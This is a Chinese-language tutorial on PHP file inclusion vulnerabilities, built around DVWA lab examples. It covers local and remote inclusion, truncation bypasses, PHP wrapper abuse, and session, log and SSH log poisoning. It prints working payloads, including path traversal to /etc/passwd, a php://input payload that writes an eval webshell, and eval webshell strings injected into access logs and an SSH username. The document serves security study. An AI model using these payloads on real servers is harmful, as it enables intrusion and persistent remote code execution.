## 0x01、什么是文件包含?

为了提高代码的复用性，引入文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码。因此一个文件里面包含另外一个/多个文件。

## 0x02、漏洞成因

文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。

**危害**

- 读取敏感文件

Windows和Linux下常见敏感文件
汇总https://blog.csdn.net/weixin_50464560/article/details/119063335

**Windows**

| 目录            | 内容           |
| --------------- | -------------- |
| \xxx\php.ini    | PHP配置信息    |
| \xxx\my.ini     | MYSQL配置信息  |
| \xxx\httpd.conf | Apache配置信息 |
| \boot.ini       | 系统版本信息   |

**Linux**

| 目录                       | 内容              |
| -------------------------- | ----------------- |
| /etc/passwd                | Linux系统账号信息 |
| /etc/httpd/conf/httpd.conf | Apache配置信息    |
| /etc/my.conf               | MySQL配置信息     |
| /usr/etc/php.ini           | PHP配置信息       |

example

```
//使用目录遍历获取

http://www.abc.com/flie.php?file=../../../../etc/passwd
```

- 获取webshell
- 任意命令执行
- ...

## 0x03、文件包含漏洞函数

#### PHP

```php
include()
include_once()
require()
require_once()

//Include()和require()的区别
require()如果在包含过程中出错，就会直接退出，不执行后续语句
include()如果在包含过程中出错，只会提出警告，但不影响后续语句的执行

//require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。

//这四个包含函数包含的文件不管是什么类型，都会直接作为php解析
```



## 0x04、文件包含漏洞分类

**4.0、文件包含漏洞的产生条件**

- 具有相关的文件包含函数
- 文件包含函数中存在动态变量，比如 `include $file;`
- 攻击者能够控制该变量，比如`$file = $_GET['file'];`

**4.1、本地文件包含漏洞**

能打开并包含本地文件的漏洞

4.1.1**无限制**

DVWA

```php
//index.php

if( isset( $file ) )
	include( $file );
else {
	header( 'Location:?page=include.php' );
	exit;
}
```

```php
//Low.php

<?php
// The page we wish to display
$file = $_GET[ 'page' ];
?>
```

利用：在Low.php同级目录下新建test.txt

```php
//test.php

<?php
phpinfo();
?>
```

访问http://127.0.0.1/DVWA/vulnerabilities/fi/?page=test.txt

文件包含可以包含任意文件，如图片，文本文件，压缩包等。如果文件中有服务器能识别的脚本语言，就按照当前脚本语言执行，否则就直接显示出源代码。

4.1.2**有限制**

有限制本地文件包含漏洞是指代码中为包含文件指定了特定的前缀或者拓展名，攻击者必须要对前缀或者拓展名过滤，才能达到利用文件包含漏洞读取操作。

**过滤绕过方式**

- %00 截断文件包含

条件：

1. magic_quotes_gpc=off、
2. PHP版本低于5.3.4

限制代码如下

```php
<?php
	$file=$_GET['file'];
	include ($file.".html");
?>
```

http://www.abc.com/xxx/file.php?file=../../../../../../boot.ini%00

通过%00截断了后面的html拓展名过滤，成功读取了boot.ini的内容

- 路径长度截断包含

操作系统存在着最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致拓展名截断。

- Windows下最大路径长度为256B
- Linux下最大路径长度为4096B

```php
http://www.abc.com/xxx/file.php?file=test.txt/././././././././././././././././././././././././././././././././././././...此处省略很多很多./
```

执行test.txt，成功截断了后面的拓展名

- 点号截断文件包含--Wndows

点号的长度大于256B的时候，就可以造成拓展名截断

```
http://www.abc.com/xxx/file.php?file=test.txt.................................................................................................................................很多很多点号
```

**4.2、远程文件包含漏洞**

能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的（本地需要文件上传到相关目录再包含），因此漏洞一旦存在，危害性会很大。

**条件：配置php.ini**

- allow_url_fopen=On
- allow_url_include=On

##### exploiation

本机ip:192.168.1.106

目标服务器ip:192.168.1.114

本机创建text.txt

```php
//test.php

<?php
phpinfo();
?>
```

访问http://192.168.1.114/DVWA/vulnerabilities/fi/?page=http://192.168.1.106/test2.txt

**有限制的远程文件包含漏洞**

```php
//测试代码

<?php
include($_GET['filename'].".html");
?>
```

- 问号绕过
- #绕过
- 空格绕过

```
https://127.0.0.1/index.php?filename=http://192.168.91.133/FI/php.txt[?|%23| ]
```

**4.3文件包含漏洞修复方式**

1.限制代码/白名单

```php
//fix.php

<?php

$filename=$_GET['filename'];
include($filename.".html");

?>
```

2.尽量关闭allow_url_include配置

3.过滤.（点）/（反斜杠）\（反斜杠）等特殊字符

4.PHP 中使用 open_basedir 设置可以包含的特定目录

**about** **open_basedir**

该配置可以设置你访问目录的权限

比如可以设置成例如open_basedir=/var/www/html/

## 0x05、文件包含漏洞之伪协议

```
- allow_url_fopen
//默认是ON，允许url里的封装协议访问文件
- allow_url_include=On
//默认是OFF，不允许url里的封装协议包含文件
```

#### **5.1php://filter**

**利用条件**

- 只是读取，所以只需要开启allow_url_fopen，对allow_url_include不做要求

**利用**

```php
index.php?file=php://filter/read=convert.base64-encode/resource=xxx.php
```

可以指定末尾的文件，读取经过base64加密后的文件源码，可以用来读取敏感文件 。

#### **5.2、php://input**

可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行

**利用条件**

- 需要开启allow_url_include=on，对allow_url_fopen不做要求

**利用**

url:[ip]/index.php?page=php://input

数据（包含的代码）用post传过去

![image-20230719104020795](C:\Users\spdadi\AppData\Roaming\Typora\typora-user-images\image-20230719104020795.png)

//使用post传入写入木马的参数代码

**因此实际上能包含执行的点都可以传入下面的payload写入木马**

```php
<?php fputs(fopen('hack.php','w'),'<?php @eval($_POST[v])?>');?>
```

也可以post命令执行

#### 5.3、zip://伪协议

zip://可以访问压缩文件中的文件(访问类似于包含)

**利用**

```
?file=zip://[压缩文件路径]#[压缩文件内的子文件名]
```

本地创建test.php，压缩成test.zip压缩包

```
127.0.0.1/index.php?page=zip://test.zip%23test.php
```

**注意**

- 使用zip协议，需要将#编码为%23，所以需要PHP 的版本> =5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23。
- `test.zip`必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过`test.zip`的后缀可以不是zip，可以是像`test.jpg`，甚至`test.111`这样的后缀都行。

#### 5.4、phar://伪协议

与zip://协议类似，但用法不同，zip://伪协议中是用#把压缩文件路径和压缩文件的子文件名隔开，而phar://伪协议中是用/把压缩文件路径和压缩文件的子文件名隔开，即

```
?file=phar://[压缩文件路径]/[压缩文件内的子文件名]
```

#### 5.5、data:text/plain

和php伪协议的input类似，也可以执行任意代码，但利用条件和用法不同

**利用条件**

条件：allow_url_fopen参数与allow_url_include都需开启

**用法**

- ?file=data:text/plain,<?php 执行内容 ?>

```
127.0.0.1/index.php?page=data.txt/plain,<?php phpinfo();?>
```

- ?file=data:text/plain;base64,编码后的php代码

```php
127.0.0.1/index.php?page=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
//PD9waHAgcGhwaW5mbygpOz8+是<?php phpinfo();?>base64的结果
```

#### 5.6、file://伪协议

file:// 用于访问本地文件系统，且不受allow_url_fopen与allow_url_include的影响。

**用法**

```url
?file=file://文件绝对路径

//example
127.0.01/index.php?page=file://C:/windows/system.ini
```

#### 5.7、://filter协议

php://filter是php中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如`base64`编码处理，`rot13`处理等。

这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。

官方文档如下

```
resource=<要过滤的数据流>     这个参数是必须的。它指定了你要筛选过滤的数据流。
read=<读链的筛选列表>         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
write=<写链的筛选列表>    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
<；两个链的筛选列表>        任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。
```

example

```
php://filter/read=过滤器|过滤器/resource=待过滤的数据流
```

其中过滤器可以设置多个，按照链式的方式依次对数据进行过滤处理。例如：

```php
echo file_get_contents("php://filter/read=convert.base64-encode|convert.base64-encode/resource=data://text/plain,<?php phpinfo();?>");

//对<?php phpinfo();?>这个字符串进行了两次base64编码处理
```

**四种过滤器**

**字符串过滤器**

```php
#string字符串开头，常见的过滤器有rot13、toupper、tolower、strip_tags等
# string.rot13即对数据流进行str_rot13函数处理
echo file_get_contents("php://filter/read=string.rot13/resource=data://text/plain,abcdefg");
# 输出结果为nopqrst
#toupper、tolower是对字符串进行大小写转换处理
#strip_tags对数据流进行strip_tags函数的处理，该函数功能为剥去字符串中的 HTML、XML 以及 PHP 的标签
```

**转换过滤器**

```php
#分别是base64的编码转换、quoted-printable的编码转换以及iconv字符编码的转换。该类过滤器以convert开头
file_get_contents("php://filter/read=convert.base64-encode/resource=data://text/plain,m1sn0w");
#base64的编码转换操作

file_get_contents("php://filter/read=convert.quoted-printable-encode/resource=data://text/plain,m1sn0w".chr(12));
# 输出为m1sn0w=0C
#可以理解为将一些不可打印的ASCII字符进行一个编码转换，转换成=后面跟两个十六进制数

file_get_contents("php://filter/read=convert.iconv.utf-8.utf-16/resource=data://text/plain,m1sn0w".chr(12));
#对输入输出的数据进行一个编码转换，其格式为convert.iconv.<input-encoding>.<output-encoding>或者convert.iconv.<input-encoding>/<output-encoding>，将输入的字符串编码转换成输出指定的编码
```

**压缩过滤器**

**加密过滤器**--自PHP7.1.0已废弃

**Tricks**-https://blog.csdn.net/gental_z/article/details/122303393

#### 5.7、expect://伪协议



## 0x06、文件包含漏洞之其他包含

#### 6.1、Session文件包含漏洞

**利用条件**

- Session的存储位置可以获取(获取session文件路径)

phpinfo的session.save_path可以获取session存储位置

猜测--php-session常见的存放位置

1. /var/lib/php/sess_PHPSESSID
2. /var/lib/php/sess_PHPSESSID
3. /tmp/sess_PHPSESSID
4. /tmp/sessions/sess_PHPSESSID

- Session的内容可控

**example**

```
//session文件包含代码如下

session_start();
$ctfs=$_GET['ctfs'];
$_SESSION['username']=$ctfs

//此代码可以通过GET型的ctfs参数传入，将获取的值存入到Session中
```

攻击者可以利用ctfs参数将恶意代码写入到session文件中，然后在利用文件包含漏洞包含此session文件，向系统中传递恶意代码。

**session文件名**

Session的文件名以sess_开头，后跟Sessionid

Sessionid可以通过开发者模式获取：

检查-存储-cookie-PHPSESSID

**利用上述example**

假设Session在默认存储位置/var/lib/php/session

先访问

```
http://www.abc.com/xxx/session.php?ctfs=<?php phpinfo();?>
```

会在/var/lib/php/session目录下将ctfs的值写入session文件

通过开发者模式获取文件名称sess_7sdfysdfywy9323cew2

最后使用LFI解析session从而利用

```
http://www.abc.com/xxx/file.php?file=../../var/lib/php/session/sess_7sdfysdfywy9323cew2
```

上面运用了目录遍历，原理如下：

现在在/var/log/test.txt文件中有php代码`<?php phpinfo();?>`，则利用`../`可以进行目录遍历，比如我们尝试访问：

```
include.php?file=../../log/test.txt
```

则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。

#### 6.2、日志文件包含

服务器的中间件，ssh服务都有日志记录的功能。如果开启了日志记录功能，用户访问的日志就会存储到不同服务的相关文件。

如果日志文件的位置是默认位置或者是可以通过其他方法获取，就可以通过访问日志将恶意代码写入到日志文件中去，然后通过文件包含漏洞包含日志中的恶意代码，获得权限。

因此**利用条件**相似

- 日志文件的存储位置已知，并且具有读取权限

##### 6.2.1、中间件日志文件包含

中间件开启了访问日志记录功能，会访问日志写入到日志文件中。

访问http://192.168.1.2/xxx/index.php

发现日志文件有以下的内容

```
[root@aaa]#less /var/log/httpd/access_log
192.168.1.200 - - [09/Aug/2021:19:31:20 +0800] "GET /xxx/index.php HTTP/1.1" 200 86....
```

中间件日志会记录访问者的IP地址、访问时间、访问路径、返回状态码等等。

由于日志记录访问路径，因此可以由此注入恶意代码

http://www.abc.com/xxx/<?php @eval($_POST['shell']);?>

查看日志如下

```
[root@aaa]#less /var/log/httpd/access_log
192.168.1.200 - - [09/Aug/2021:19:35:23 +0800] "GET /xxx/%3C?php @eval($_POST['shell']);?%3E HTTP/1.1" 404 826....
```

发现成功写入

但是浏览器会对URL进行URL编码，导致代码写入日志不能正常使用

因此可以使用burpsuite抓包写入，再次查看日志内容

```
[root@aaa]#less /var/log/httpd/access_log
192.168.1.200 - - [09/Aug/2021:19:37:33 +0800] "GET /xxx/<?php @eval($_POST['shell']);?> HTTP/1.1" 404 302....
```

之后要执行文件包含，猜测日志文件的位置--常见的中间件日志文件都有默认的存储路径，比如Apache的中间件日志文件存在/var/log/httpd/目录下，文件名叫access_log

输入测试语句http://www.abc.com/xxx/file.php?file=../../../var/log/httpd/access_log，同时post传入shell=phpinfo();

即可执行木马显示phpinfo内容

##### 6.2.2、SSH日志文件包含

**利用方式**类似，如下

先将恶意代码写入文件：

SSH如果开启了日志记录的功能，那么会将ssh的连接日志记录到ssh日志文件当中，将连接的用户名设置成恶意代码，用命令连接服务器192.168.1.1的ssh服务
`ssh "<?php @eval($_POST['shell']);?>"@192.168.1.1`

查看日志文件/var/log/auth.log，发现成功写入

之后使用文件包含日志文件

输入测试语句http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log，同时post传入shell=phpinfo();

即可执行木马显示phpinfo内容

### 6.3文件上传包含

利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。

姿势：

往往要配合上传的姿势，不说了，太多了。

### 6.4environ包含

**利用条件**

- php以cgi方式运行，这样environ才会保持UA头。
- environ文件存储位置已知，且environ文件可读。

**原理**

proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。